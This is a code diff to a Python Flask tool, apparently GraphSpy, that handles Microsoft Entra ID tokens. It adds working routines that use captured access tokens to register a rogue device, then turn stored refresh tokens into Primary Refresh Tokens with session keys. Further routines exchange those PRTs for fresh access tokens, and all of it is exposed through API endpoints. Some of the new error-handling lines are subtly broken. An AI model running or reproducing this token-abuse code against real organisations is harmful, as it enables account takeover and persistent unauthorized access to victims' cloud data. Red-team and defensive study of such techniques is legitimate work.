@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-from flask import Flask,render_template,request,g,redirect,Response
+from flask import Flask,render_template,request,g,redirect,Response,jsonify
 import flask.helpers
 import requests
 import jwt
@@ -20,15 +20,17 @@ with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),"version.txt")
 def init_db():
     con = sqlite3.connect(app.config['graph_spy_db_path'])
     con.execute('CREATE TABLE accesstokens (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at TEXT, issued_at TEXT, expires_at TEXT, description TEXT, user TEXT, resource TEXT, accesstoken TEXT)')
-    con.execute('CREATE TABLE refreshtokens (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at TEXT, description TEXT, user TEXT, tenant_id TEXT, resource TEXT, foci INTEGER, refreshtoken TEXT)')
+    con.execute('CREATE TABLE refreshtokens (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at TEXT, description TEXT, user TEXT, tenant_id TEXT, client_id TEXT, resource TEXT, foci INTEGER, refreshtoken TEXT)')
     con.execute('CREATE TABLE devicecodes (id INTEGER PRIMARY KEY AUTOINCREMENT, generated_at INTEGER, expires_at INTEGER, user_code TEXT, device_code TEXT, interval INTEGER, client_id TEXT, status TEXT, last_poll INTEGER)')
     con.execute('CREATE TABLE request_templates (id INTEGER PRIMARY KEY AUTOINCREMENT, template_name TEXT, uri TEXT, method TEXT, request_type TEXT, body TEXT, headers TEXT, variables TEXT)')
     con.execute('CREATE TABLE teams_settings (access_token_id INTEGER PRIMARY KEY, skypeToken TEXT, skype_id TEXT, issued_at INTEGER, expires_at INTEGER, teams_settings_raw TEXT)')
     con.execute('CREATE TABLE mfa_otp (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at TEXT, secret_key TEXT, account_name INTEGER, description TEXT)')
+    con.execute('CREATE TABLE device_certificates (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, device_name TEXT, device_type TEXT, priv_key TEXT, certificate TEXT)')
+    con.execute('CREATE TABLE primary_refresh_tokens (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, user TEXT, prt TEXT, session_key TEXT, issued_at INTEGER, expires_at INTEGER)') # To check if this is complete?
     con.execute('CREATE TABLE settings (setting TEXT UNIQUE, value TEXT)')
     # Valid Settings: active_access_token_id, active_refresh_token_id, schema_version, user_agent
     cur = con.cursor()
-    cur.execute("INSERT INTO settings (setting, value) VALUES ('schema_version', '4')")
+    cur.execute("INSERT INTO settings (setting, value) VALUES ('schema_version', '5')")
     con.commit()
     con.close()
 
@@ -59,6 +61,7 @@ def execute_db(statement, args=()):
     cur = con.cursor()
     cur.execute(statement, args)
     con.commit()
+    return cur.lastrowid
     
 def make_dicts(cursor, row):
     return dict((cursor.description[idx][0], value)
@@ -76,7 +79,7 @@ def list_databases():
     return databases
 
 def update_db():
-    latest_schema_version = "4"
+    latest_schema_version = "5"
     current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
     if current_schema_version == "1":
         print("[*] Current database is schema version 1, updating to schema version 2")
@@ -96,6 +99,15 @@ def update_db():
         execute_db("UPDATE settings SET value = '4' WHERE setting = 'schema_version'")
         print("[*] Updated database to schema version 4")
         current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
+    if current_schema_version == "4":
+        print("[*] Current database is schema version 4, updating to schema version 5")
+        execute_db('CREATE TABLE device_certificates (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, device_name TEXT, device_type TEXT, priv_key TEXT, certificate TEXT)')
+        execute_db('CREATE TABLE primary_refresh_tokens (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, user TEXT, prt TEXT, session_key TEXT, issued_at INTEGER, expires_at INTEGER)')
+        execute_db("ALTER TABLE refreshtokens ADD COLUMN client_id TEXT")
+        execute_db("UPDATE settings SET value = '5' WHERE setting = 'schema_version'")
+        print("[*] Updated database to schema version 5")
+        current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
+
 
 # ========== Helper Functions ==========
 
@@ -114,7 +126,16 @@ def create_response(status_code, message = None, data = None):
         response_body["message"] = message
     if data != None:
         response_body["data"] = data
-    return response_body, status_code
+    return jsonify(response_body), status_code
+
+def parse_token_endpoint_error(error_response):
+    try:
+        error_code = error_response.json().get('error', 'Unknown error')
+        error_description = error_response.json().get('error_description', 'Unknown error')
+        error_msg = f"[{error_response.status_code}] {error_code}: {error_description}"
+    except ValueError:
+        error_msg = f"[{error_response.status_code}] {error_response.text}"
+    return error_msg
 
 def get_user_agent():
     user_agent = query_db("SELECT value FROM settings where setting = 'user_agent'",one=True)
@@ -226,7 +247,7 @@ def save_access_token(accesstoken, description):
             else decoded_accesstoken["oid"] if "oid" in decoded_accesstoken \
             else "unknown"
     
-    execute_db("INSERT INTO accesstokens (stored_at, issued_at, expires_at, description, user, resource, accesstoken) VALUES (?,?,?,?,?,?,?)",(
+    row_id = execute_db("INSERT INTO accesstokens (stored_at, issued_at, expires_at, description, user, resource, accesstoken) VALUES (?,?,?,?,?,?,?)",(
             f"{datetime.now()}".split(".")[0],
             datetime.fromtimestamp(decoded_accesstoken["iat"]) if "iat" in decoded_accesstoken else "unknown",
             datetime.fromtimestamp(decoded_accesstoken["exp"]) if "exp" in decoded_accesstoken else "unknown",
@@ -236,16 +257,18 @@ def save_access_token(accesstoken, description):
             accesstoken
             )
     )
+    return row_id
     
-def save_refresh_token(refreshtoken, description, user, tenant, resource, foci):
+def save_refresh_token(refreshtoken, description, user, tenant, resource, foci, client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"):
     # Used to convert potential boolean inputs to an integer, as the DB uses an integer to store this value
     foci_int = 1 if foci else 0
     tenant_id = tenant.strip('"{}-[]\\/\' ') if is_valid_uuid(tenant.strip('"{}-[]\\/\' ')) else get_tenant_id(tenant)
-    execute_db("INSERT INTO refreshtokens (stored_at, description, user, tenant_id, resource, foci, refreshtoken) VALUES (?,?,?,?,?,?,?)",(
+    execute_db("INSERT INTO refreshtokens (stored_at, description, user, tenant_id, client_id, resource, foci, refreshtoken) VALUES (?,?,?,?,?,?,?,?)",(
             f"{datetime.now()}".split(".")[0],
             description,
             user,
             tenant_id,
+            client_id,
             resource,
             foci_int,
             refreshtoken
@@ -266,10 +289,11 @@ def get_tenant_id(tenant_domain):
     tenant_id = resp_json["authorization_endpoint"].split("/")[3]
     return tenant_id
 
-def refresh_to_access_token(refresh_token_id, client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c", resource = "defined_in_token", scope = "", store_refresh_token = True, api_version = 1):
+def refresh_to_access_token(refresh_token_id, client_id = "defined_in_token", resource = "defined_in_token", scope = "", store_refresh_token = True, api_version = 1):
     refresh_token = query_db("SELECT refreshtoken FROM refreshtokens where id = ?",[refresh_token_id],one=True)[0]
-    tenant_id = query_db("SELECT tenant_id FROM refreshtokens where id = ?",[refresh_token_id],one=True)[0]
+    tenant_id = query_db("SELECT tenant_id FROM refreshtokens where id = ?",[refresh_token_id],one=True)[0] or "common"
     resource = query_db("SELECT resource FROM refreshtokens where id = ?",[refresh_token_id],one=True)[0] if resource == "defined_in_token" else resource
+    client_id = query_db("SELECT client_id FROM refreshtokens where id = ?",[refresh_token_id],one=True)[0] if client_id == "defined_in_token" else client_id
     body =  {
         "client_id": client_id,
         "grant_type": "refresh_token",
@@ -285,9 +309,8 @@ def refresh_to_access_token(refresh_token_id, client_id = "d3590ed6-52b3-4102-ae
 
     headers = {"User-Agent":get_user_agent()}
     response = requests.post(url, data=body, headers=headers)
-    if "error" in response.json():
-        error_msg = f"[{response.json()['error']}] {response.json()['error_description']}"
-        return error_msg
+    if response.status_code != 200:
+        return {parse_token_endpoint_error(response)}
     access_token = response.json()["access_token"]
     save_access_token(access_token, f"Created using refresh token {refresh_token_id}")
     access_token_id = query_db("SELECT id FROM accesstokens where accesstoken = ?",[access_token],one=True)[0]
@@ -306,7 +329,8 @@ def refresh_to_access_token(refresh_token_id, client_id = "d3590ed6-52b3-4102-ae
             user,
             tenant_id,
             response.json()["resource"]  if "resource" in response.json() else "unknown",
-            response.json()["foci"] if "foci" in response.json() else 0
+            response.json()["foci"] if "foci" in response.json() else 0,
+            client_id
         )
     return access_token_id
 
@@ -339,10 +363,7 @@ def generate_device_code(version= 1, client_id = "d3590ed6-52b3-4102-aeff-aad229
     headers = {"User-Agent":get_user_agent()}
     response = requests.post(url, data=body,headers=headers)
     if response.status_code != 200:
-            try:
-                raise AppError(f"Failed to generate device code.\n{response.json().get('error_description')}.")
-            except ValueError:
-                raise AppError(f"Failed to generate device code.\nReceived status code {response.status_code}.")
+        raise AppError(f"Failed to generate device code.\n{parse_token_endpoint_error(response)}")
     execute_db("INSERT INTO devicecodes (generated_at, expires_at, user_code, device_code, interval, client_id, status, last_poll) VALUES (?,?,?,?,?,?,?,?)",(
             int(datetime.now().timestamp()),
             int(datetime.now().timestamp()) + int(response.json()["expires_in"]),
@@ -401,7 +422,8 @@ def poll_device_codes():
                         user, 
                         decoded_accesstoken["tid"] if "tid" in decoded_accesstoken else "unknown", 
                         response.json()["resource"]if "resource" in response.json() else "unknown", 
-                        int(response.json()["foci"]) if "foci" in response.json() else 0
+                        int(response.json()["foci"]) if "foci" in response.json() else 0,
+                        row["client_id"]
                     )
                     execute_db("UPDATE devicecodes SET status = ? WHERE device_code = ?",("SUCCESS",row["device_code"]))
 
@@ -445,6 +467,289 @@ def get_device_code_reprocess_url(user_code):
         return create_response("400", "Failed to obtain reprocess URL.")
     return reprocess_url.group(1)
 
+# ========== PRT Functions ==========
+
+def register_device(access_token_id, device_name, join_type = 0, device_type = "Windows", os_version = "10.0.26100", target_domain = "e-corp.local"):
+    """
+    All credit to:
+    https://github.com/dirkjanm/ROADtools
+    https://github.com/kiwids0220/deviceCode2WinHello
+    """	
+    import struct
+    from cryptography.hazmat.primitives.asymmetric import rsa
+    from cryptography.hazmat.primitives import serialization, hashes
+    from cryptography import x509
+    from cryptography.x509.oid import NameOID
+    # Generate a private key
+    key = rsa.generate_private_key(
+            public_exponent=65537,
+            key_size=2048,
+        )
+    private_key = key.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm=serialization.NoEncryption()
+    )
+    private_key_base64 = base64.b64encode(private_key).decode('utf-8')
+    # Generate public key RSA blob
+    public_key = key.public_key()
+    pubnumbers = public_key.public_numbers()
+    exponent_as_bytes = pubnumbers.e.to_bytes((pubnumbers.e.bit_length() + 7) // 8, byteorder='big')
+    modulus_as_bytes = pubnumbers.n.to_bytes((pubnumbers.n.bit_length() + 7) // 8, byteorder='big')
+    header = [
+        b'RSA1',
+        struct.pack('<L', public_key.key_size),
+        struct.pack('<L', len(exponent_as_bytes)),
+        struct.pack('<L', len(modulus_as_bytes)),
+        # No private key so these are zero
+        struct.pack('<L', 0),
+        struct.pack('<L', 0),
+    ]
+    pubkeycngblob = base64.b64encode(b''.join(header)+exponent_as_bytes+modulus_as_bytes)
+    # Generate Certificate Signing Request
+    csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([
+            x509.NameAttribute(NameOID.COMMON_NAME, "7E980AD9-B86D-4306-9425-9AC066FB014A"),
+        ])).sign(key, hashes.SHA256())
+    certreq = csr.public_bytes(serialization.Encoding.DER)
+    certbytes = base64.b64encode(certreq)
+
+    request_body = {
+        "CertificateRequest":
+            {
+                "Type": "pkcs10",
+                "Data": certbytes.decode('utf-8')
+            },
+        "TransportKey": pubkeycngblob.decode('utf-8'),
+        "TargetDomain": target_domain,
+        "DeviceType": device_type,
+        "OSVersion": os_version,
+        "DeviceDisplayName": device_name,
+        "JoinType": join_type,
+        "attributes": {
+            "ReuseDevice": "true",
+            "ReturnClientSid": "true"
+        }
+    }
+    # Registering device
+    access_token = query_db("SELECT accesstoken FROM accesstokens where id = ?",[access_token_id],one=True)[0]
+    if not access_token:
+        raise AppError(f"No access token with ID {access_token_id}!")
+    headers = {"User-Agent": get_user_agent(), "Authorization": f"Bearer {access_token}"}
+    response = requests.post("https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=2.0", headers=headers, json=request_body)
+    if response.status_code != 200:
+        raise AppError(f"Failed to register device.\n{parse_token_endpoint_error(response)}")
+    response_json = response.json()
+    gspy_log.debug(f"Device registration response:\n{response_json}")
+    if not "Certificate" in response_json:
+        raise AppError(f"Failed to register device. No certificate in response.")
+    # Store certificate and private key
+    certificate_base64 = response_json['Certificate']['RawBody']
+    certificate = x509.load_der_x509_certificate(base64.b64decode(certificate_base64))
+    device_id = certificate.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value
+    execute_db("INSERT INTO device_certificates (device_id, device_name, device_type, priv_key, certificate) VALUES (?, ?, ?, ?, ?)", (device_id, device_name, device_type, private_key_base64, certificate_base64))
+    return device_id
+
+def get_srv_challenge_nonce():
+    nonce_response = requests.post('https://login.microsoftonline.com/common/oauth2/token', data={'grant_type':'srv_challenge'})
+    if nonce_response.status_code != 200:
+        raise AppError(f"Failed to obtain nonce.\n{parse_token_endpoint_error(nonce_response)}")
+    nonce_response_json = nonce_response.json()
+    if not "Nonce" in nonce_response_json:
+        raise AppError(f"Failed to obtain nonce. No 'Nonce' in response.")
+    return nonce_response_json["Nonce"]
+
+def request_prt_for_device(device_id, refresh_token_id, os_version = "10.0.26100"):
+    """
+    All credit to:
+    https://github.com/dirkjanm/ROADtools
+    https://github.com/kiwids0220/deviceCode2WinHello
+    """	
+    import binascii
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.asymmetric import padding as apadding
+    from cryptography.hazmat.primitives import serialization
+    nonce = get_srv_challenge_nonce()
+    refresh_token = query_db("SELECT refreshtoken FROM refreshtokens WHERE id = ?",[refresh_token_id],one=True)[0]
+    refresh_token_user = query_db("SELECT user FROM refreshtokens WHERE id = ?",[refresh_token_id],one=True)[0]
+    if not refresh_token:
+        raise AppError(f"No refresh token with ID {refresh_token_id}!")
+    
+    certificate_base64 = query_db("SELECT certificate FROM device_certificates WHERE device_id = ?",[device_id],one=True)[0]
+    private_key_base64 = query_db("SELECT priv_key FROM device_certificates WHERE device_id = ?",[device_id],one=True)[0]
+    if not certificate_base64 or not private_key_base64:
+        raise AppError(f"No certificate or private key for device with ID {device_id}!")
+    private_key_bytes = base64.b64decode(private_key_base64)
+    private_key = serialization.load_pem_private_key(private_key_bytes, password=None)
+    # Generate and sign JWT
+    jwt_payload = {
+        "client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e",
+        "request_nonce": nonce,
+        "scope": "openid aza ugs",
+        "group_sids": [],
+        "win_ver": os_version,
+        "grant_type": "refresh_token",
+        "refresh_token": refresh_token,
+    }
+    jwt_header = {
+        "x5c": certificate_base64,
+        "kdf_ver": 2
+    }
+    request_jwt = jwt.encode(jwt_payload, key=private_key, algorithm='RS256', headers=jwt_header)
+    # Request PRT
+    prt_request_data = {
+        'windows_api_version':'2.2',
+        'grant_type':'urn:ietf:params:oauth:grant-type:jwt-bearer',
+        'request':request_jwt,
+        'tgt': False # No need to request a TGT right now with the current functionality, maybe support it later
+    }
+    headers = {"User-Agent":get_user_agent()}
+    response = requests.post("https://login.microsoftonline.com/common/oauth2/token", data=prt_request_data, headers=headers)
+    if response.status_code != 200:
+        raise AppError(parse_token_endpoint_error(response))
+    response_json = response.json()
+    gspy_log.debug(f"PRT request response:\n{response_json}")
+    if not "refresh_token" in response_json or not "session_key_jwe" in response_json:
+        raise AppError(f"Failed to request PRT. No 'refresh_token' or 'session_key_jwe' in response.")
+    prt = response_json["refresh_token"]
+    # Decrypt session key
+    session_key_jwe = response_json["session_key_jwe"]
+    jwe_payload_base64 = session_key_jwe.split(".")[1]
+    jwe_payload_base64_padded = jwe_payload_base64 + ('='*(len(jwe_payload_base64)%4))
+    jwe_payload_bytes = base64.urlsafe_b64decode(jwe_payload_base64_padded)
+    session_key_bytes =private_key.decrypt(jwe_payload_bytes, apadding.OAEP(apadding.MGF1(hashes.SHA1()), hashes.SHA1(), None))
+    session_key_hex = binascii.hexlify(session_key_bytes).decode('utf-8')
+    # Store PRT
+    issued_at = int(datetime.now().timestamp())
+    expires_at = response_json["expires_on"]
+    prt_id = execute_db("INSERT INTO primary_refresh_tokens (device_id, user, prt, session_key, issued_at, expires_at) VALUES (?, ?, ?, ?, ?, ?)", (device_id, refresh_token_user, prt, session_key_hex, issued_at, expires_at))
+    return prt_id
+
+def calculate_derived_key(session_key, context):
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.kdf.kbkdf import CounterLocation, KBKDFHMAC, Mode
+    from cryptography.hazmat.backends import default_backend
+    backend = default_backend()
+    kdf = KBKDFHMAC(
+        algorithm=hashes.SHA256(),
+        mode=Mode.CounterMode,
+        length=32,
+        rlen=4,
+        llen=4,
+        location=CounterLocation.BeforeFixed,
+        label=b"AzureAD-SecureConversation",
+        context=context,
+        fixed=None,
+        backend=backend
+    )
+    return kdf.derive(session_key)
+
+#    con.execute('CREATE TABLE device_certificates (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, device_name TEXT, device_type TEXT, priv_key TEXT, certificate TEXT)')
+#    con.execute('CREATE TABLE primary_refresh_tokens (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, prt TEXT, session_key TEXT, issued_at INTEGER, expires_at INTEGER)')  # To check if this is complete?
+def refresh_prt_to_access_token(prt_id, client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c", resource = "https://graph.microsoft.com", refresh_prt = True, redirect_uri = None) -> int:
+    """
+    All credit to:
+    https://github.com/dirkjanm/ROADtools
+    """	
+    from cryptography.hazmat.primitives import hashes, padding
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    import binascii
+    prt_row = query_db_json("SELECT * FROM primary_refresh_tokens WHERE id = ?",[prt_id],one=True)
+    if not prt_row:
+        raise AppError(f"No PRT found with ID {prt_id}!")
+    prt = prt_row["prt"]
+    session_key = binascii.unhexlify(prt_row["session_key"])
+    nonce = get_srv_challenge_nonce()
+    jwt_payload = {
+            "win_ver": "10.0.26100",
+            "scope": ("openid aza" if refresh_prt else "openid"), # If scope includes "aza", it will issue a new PRT. Else it will issue a regular refresh token
+            "request_nonce": nonce,
+            "refresh_token": prt,
+            "redirect_uri": f"ms-appx-web://Microsoft.AAD.BrokerPlugin/{client_id}" if not redirect_uri else redirect_uri,
+            "iss": "aad:brokerplugin",
+            "grant_type": "refresh_token",
+            "client_id": client_id,
+            "resource": resource,
+            "aud": "login.microsoftonline.com",
+            "iat": str(int(time.time())),
+            "exp": str(int(time.time())+(3600)),
+        }
+
+    context = os.urandom(24)
+    jwt_headers = {
+        'ctx': base64.b64encode(context).decode('utf-8'),
+        'kdf_ver': 2
+    }
+    # Sign with random key to get jwt body in right encoding
+    tempjwt = jwt.encode(jwt_payload, os.urandom(32), algorithm='HS256', headers=jwt_headers)
+    jbody = tempjwt.split('.')[1]
+    jwtbody = base64.urlsafe_b64decode(jbody+('='*(len(jbody)%4)))
+    digest = hashes.Hash(hashes.SHA256())
+    digest.update(context)
+    digest.update(jwtbody)
+    kdfcontext = digest.finalize()
+    derived_key = calculate_derived_key(session_key,kdfcontext)
+    request_jwt = jwt.encode(jwt_payload, derived_key, algorithm='HS256', headers=jwt_headers)
+    token_request_data = {
+            'windows_api_version':'2.2',
+            'grant_type':'urn:ietf:params:oauth:grant-type:jwt-bearer',
+            'request':request_jwt,
+            'client_info':'1'
+        }
+    headers = {"User-Agent":get_user_agent()}
+    response = requests.post("https://login.microsoftonline.com/common/oauth2/token", data=token_request_data, headers=headers)
+    if response.status_code != 200:
+        raise AppError(parse_token_endpoint_error(response))
+    encrypted_token_response = response.text
+    gspy_log.debug(f"PRT to access token response:\n{encrypted_token_response}")
+    headerdata, enckey, iv, ciphertext, authtag = encrypted_token_response.split('.')
+    response_context = json.loads(base64.urlsafe_b64decode(headerdata+('='*(len(headerdata)%4)))).get("ctx")
+    response_derived_key = calculate_derived_key(session_key, base64.b64decode(response_context))
+    iv_raw = base64.urlsafe_b64decode(iv+('='*(len(iv)%4)))
+    ciphertext_raw = base64.urlsafe_b64decode(ciphertext+('='*(len(ciphertext)%4)))
+    if len(iv_raw) == 12:
+        aesgcm = AESGCM(response_derived_key)
+        authtag_raw = base64.urlsafe_b64decode(authtag+('='*(len(authtag)%4)))
+        decrypted_response = aesgcm.decrypt(iv_raw, ciphertext_raw + authtag_raw, headerdata.encode('utf-8'))
+    else:
+        cipher = Cipher(algorithms.AES(response_derived_key), modes.CBC(iv_raw))
+        decryptor = cipher.decryptor()
+        decrypted_data = decryptor.update(ciphertext_raw) + decryptor.finalize()
+        unpadder = padding.PKCS7(128).unpadder()
+        decrypted_response = unpadder.update(decrypted_data) + unpadder.finalize()
+    decrypted_response_json = json.loads(decrypted_response)
+    gspy_log.debug(f"Decrypted PRT to access token response: \n{decrypted_response_json}")
+    if not "access_token" in decrypted_response_json:
+        raise AppError(f"Failed to request access token with PRT. No 'access_token' in decrypted token response.")
+    access_token_row_id = save_access_token(decrypted_response_json["access_token"], f"Created using PRT {prt_id}")
+    issued_at = int(datetime.now().timestamp())
+    expires_at = issued_at + int(decrypted_response_json["refresh_token_expires_in"])
+    if refresh_prt and "refresh_token" in decrypted_response_json:
+        prt_id = execute_db("INSERT INTO primary_refresh_tokens (device_id, user, prt, session_key, issued_at, expires_at) VALUES (?, ?, ?, ?, ?, ?)", (
+            prt_row["device_id"], 
+            prt_row["user"], 
+            decrypted_response_json["refresh_token"], 
+            prt_row["session_key"], 
+            issued_at, 
+            expires_at
+            )
+        )
+    elif "refresh_token" in decrypted_response_json:
+        refresh_token_id = execute_db("INSERT INTO refreshtokens (stored_at, description, user, tenant_id, client_id, resource, foci, refreshtoken) VALUES (?,?,?,?,?,?,?,?)",(
+            f"{datetime.now()}".split(".")[0],
+            f"Created using PRT {prt_id}",
+            prt_row["user"],
+            "common",
+            client_id,
+            resource,
+            decrypted_response_json.get("foci", 0),
+            decrypted_response_json.get("refresh_token"),
+            )
+        )
+    else:
+        raise gspy_log.debug("No refresh token or PRT found in decrypted response. Only stored access token.")
+    return access_token_row_id
+        
 # ========== MFA Functions ==========
 
 def get_security_info_type(type_id):
@@ -1110,6 +1415,73 @@ def init_routes():
         execute_db("DELETE FROM devicecodes where id = ?",[id])
         return "true"
     
+        # ========== PRT ==========
+
+    #con.execute('CREATE TABLE device_certificates (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, device_name TEXT, device_type TEXT, priv_key TEXT, certificate TEXT)')
+    #con.execute('CREATE TABLE primary_refresh_tokens (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, prt TEXT, session_key TEXT, issued_at INTEGER, expires_at INTEGER)') 
+    
+    @app.post("/api/register_device")
+    def api_register_device():
+        if not "access_token_id" in request.form:
+            return f"[Error] No access_token_id specified.", 400
+        access_token_id = request.form['access_token_id']
+        device_name = request.form.get('device_name', "GraphSpy-Device")
+        join_type = request.form.get('join_type', 0)
+        device_type = request.form.get('device_type', "Windows")
+        os_version = request.form.get('os_version', "10.0.26100")
+        target_domain = request.form.get('target_domain', "e-corp.local")
+        device_id = register_device(access_token_id, device_name, join_type, device_type, os_version, target_domain)
+        if not device_id:
+            return create_response(400, "Failed to register device.")
+        return create_response(200, f"Successfully registered new device with Device ID {device_id}.", {"device_id": device_id})
+
+    @app.route("/api/list_device_certificates")
+    def api_list_device_certificates():
+        rows = query_db_json("SELECT * FROM device_certificates")
+        return create_response(200, data=rows)
+    
+    @app.post("/api/delete_device_certificate")
+    def api_delete_device_certificate():
+        if not "id" in request.form:
+            return f"[Error] No id specified.", 400
+        id = request.form['id']
+        execute_db("DELETE FROM device_certificates WHERE id = ?",[id])
+        return create_response(200, f"Deleted device certificate with ID {id}.")
+
+    @app.post("/api/request_prt_for_device")
+    def api_request_prt_for_device():
+        if not "device_id" in request.form:
+            return f"[Error] No device_id specified.", 400
+        device_id = request.form['device_id']
+        if not "refresh_token_id" in request.form:
+            return f"[Error] No refresh_token_id specified.", 400
+        refresh_token_id = request.form['refresh_token_id']
+        os_version = request.form.get('os_version', "10.0.26100")
+        prt_id = request_prt_for_device(device_id, refresh_token_id, os_version)
+        if not prt_id:
+            return create_response(400, f"Failed to request PRT for device with ID {device_id}.")
+        return create_response(200, f"Successfully requested PRT with ID {prt_id}.", {"prt_id": prt_id})
+
+    @app.route("/api/list_primary_refresh_tokens")
+    def api_list_primary_refresh_tokens():
+        rows = query_db_json("SELECT * FROM primary_refresh_tokens")
+        return create_response(200, data=rows)
+    
+    @app.route("/api/get_primary_refresh_token/<id>")
+    def api_get_primary_refresh_token(id):
+        rows = query_db_json("SELECT * FROM primary_refresh_tokens WHERE id = ?",[id],one=True)
+        if not rows:
+            return create_response(400, f"No primary refresh token with ID {id} found.")
+        return create_response(200, data=rows)
+
+    @app.post("/api/delete_primary_refresh_token")
+    def api_delete_primary_refresh_token():
+        if not "id" in request.form:
+            return f"[Error] No id specified.", 400
+        id = request.form['id']
+        execute_db("DELETE FROM primary_refresh_tokens WHERE id = ?",[id])
+        return create_response(200, f"Deleted primary refresh token with ID {id}.")
+    
         # ========== MFA ==========
 
     @app.post("/api/get_available_authentication_info")
@@ -1342,17 +1714,16 @@ def init_routes():
         resource = request.form['resource'] if "resource" in request.form else ""
         description = request.form['description'] if "description" in request.form else ""
         foci = 1 if "foci" in request.form else 0
+        client_id = request.form['client_id'] if "client_id" in request.form else "d3590ed6-52b3-4102-aeff-aad2292ab01c"
         if refreshtoken and tenant and resource:
-            save_refresh_token(refreshtoken, description, user, tenant, resource, foci)
+            save_refresh_token(refreshtoken, description, user, tenant, resource, foci, client_id)
         return redirect('/refresh_tokens')
 
     @app.post('/api/refresh_to_access_token')
     def api_refresh_to_access_token():
         refresh_token_id = request.form['refresh_token_id'] if "refresh_token_id" in request.form else ""
-        client_id = request.form['client_id'] if "client_id" in request.form else ""
-        client_id = client_id if client_id else "d3590ed6-52b3-4102-aeff-aad2292ab01c"
-        resource = request.form['resource'] if "resource" in request.form else ""
-        resource = resource if resource else "defined_in_token"
+        client_id = request.form['client_id'] if "client_id" in request.form else "defined_in_token"
+        resource = request.form['resource'] if "resource" in request.form else "defined_in_token"
         scope = request.form['scope'] if "scope" in request.form else ""
         scope = scope if scope else "https://graph.microsoft.com/.default openid offline_access"
         api_version = int(request.form['api_version']) if "api_version" in request.form else 1
@@ -1998,7 +2369,7 @@ def init_routes():
     @app.errorhandler(AppError)
     def handle_app_error(e):
         gspy_log.error(f"AppError in {e.func_name}():{e.line_number} - {e.message}")
-        return {"message": e.message}, e.status_code
+        return jsonify({"message": e.message}), e.status_code
 
     @app.teardown_appcontext
     def close_connection(exception):
